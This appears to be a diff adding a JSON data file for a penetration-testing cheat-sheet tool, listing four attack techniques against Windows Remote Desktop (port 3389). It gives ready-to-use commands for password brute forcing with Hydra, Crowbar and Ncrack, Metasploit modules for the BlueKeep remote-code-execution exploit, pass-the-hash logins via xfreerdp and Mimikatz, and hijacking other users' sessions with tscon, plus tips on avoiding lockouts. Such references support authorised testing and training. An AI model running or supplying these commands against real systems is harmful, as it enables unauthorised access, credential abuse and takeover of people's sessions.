@@ -1,0 +1,130 @@
+{
+    "name": "RDP - Remote Desktop Protocol",
+    "port": 3389,
+    "description": "Windows Remote Desktop exploitation",
+    "icon": "🖥️",
+    "techniques": [
+        {
+            "id": "rdp-1",
+            "name": "Brute Force Attack",
+            "difficulty": "Beginner",
+            "description": "Crack RDP credentials through password guessing",
+            "steps": [
+                "Verify RDP is accessible",
+                "Gather username list",
+                "Launch brute force attack"
+            ],
+            "commands": [
+                {
+                    "tool": "Hydra",
+                    "command": "hydra -l administrator -P passwords.txt rdp://<target_ip>",
+                    "description": "Brute force RDP"
+                },
+                {
+                    "tool": "Crowbar",
+                    "command": "crowbar -b rdp -s <target_ip>/32 -u admin -C passwords.txt",
+                    "description": "RDP brute force tool"
+                },
+                {
+                    "tool": "Ncrack",
+                    "command": "ncrack -p 3389 --user administrator -P passwords.txt <target_ip>",
+                    "description": "Ncrack RDP attack"
+                }
+            ],
+            "tips": [
+                "RDP often has account lockout enabled",
+                "Use password spraying instead"
+            ]
+        },
+        {
+            "id": "rdp-2",
+            "name": "BlueKeep (CVE-2019-0708)",
+            "difficulty": "Advanced",
+            "description": "Exploit critical RDP vulnerability for RCE",
+            "steps": [
+                "Verify Windows version",
+                "Scan for BlueKeep vulnerability",
+                "Configure exploit",
+                "Execute and obtain shell"
+            ],
+            "commands": [
+                {
+                    "tool": "Metasploit Scanner",
+                    "command": "use auxiliary/scanner/rdp/cve_2019_0708_bluekeep",
+                    "description": "BlueKeep vulnerability scanner"
+                },
+                {
+                    "tool": "Metasploit Exploit",
+                    "command": "use exploit/windows/rdp/cve_2019_0708_bluekeep_rce",
+                    "description": "BlueKeep RCE exploit"
+                }
+            ],
+            "tips": [
+                "Affects Windows 7, Server 2008, XP",
+                "Can cause BSOD if exploit fails",
+                "NLA must be disabled to be vulnerable"
+            ]
+        },
+        {
+            "id": "rdp-3",
+            "name": "Pass-the-Hash RDP",
+            "difficulty": "Intermediate",
+            "description": "Use NTLM hash for RDP authentication",
+            "steps": [
+                "Obtain NTLM hash",
+                "Configure Restricted Admin mode",
+                "Use hash for RDP connection"
+            ],
+            "commands": [
+                {
+                    "tool": "xfreerdp",
+                    "command": "xfreerdp /u:administrator /pth:<ntlm_hash> /v:<target_ip>",
+                    "description": "RDP with pass-the-hash"
+                },
+                {
+                    "tool": "Mimikatz",
+                    "command": "sekurlsa::pth /user:admin /domain:. /ntlm:<hash> /run:'mstsc.exe /v:<target>'",
+                    "description": "Pass-the-hash with mimikatz"
+                }
+            ],
+            "tips": [
+                "Requires Restricted Admin mode enabled",
+                "Works with local admin accounts"
+            ]
+        },
+        {
+            "id": "rdp-4",
+            "name": "Session Hijacking",
+            "difficulty": "Advanced",
+            "description": "Hijack existing RDP sessions",
+            "steps": [
+                "Gain SYSTEM privileges",
+                "List active sessions",
+                "Identify target session",
+                "Connect to session"
+            ],
+            "commands": [
+                {
+                    "tool": "Query Sessions",
+                    "command": "query user",
+                    "description": "List active user sessions"
+                },
+                {
+                    "tool": "Hijack Session",
+                    "command": "tscon <session_id> /dest:console",
+                    "description": "Hijack session to console"
+                },
+                {
+                    "tool": "Mimikatz TS",
+                    "command": "ts::sessions",
+                    "description": "List and hijack with mimikatz"
+                }
+            ],
+            "tips": [
+                "Requires SYSTEM privileges",
+                "Can access disconnected sessions",
+                "No password needed for hijacking"
+            ]
+        }
+    ]
+}
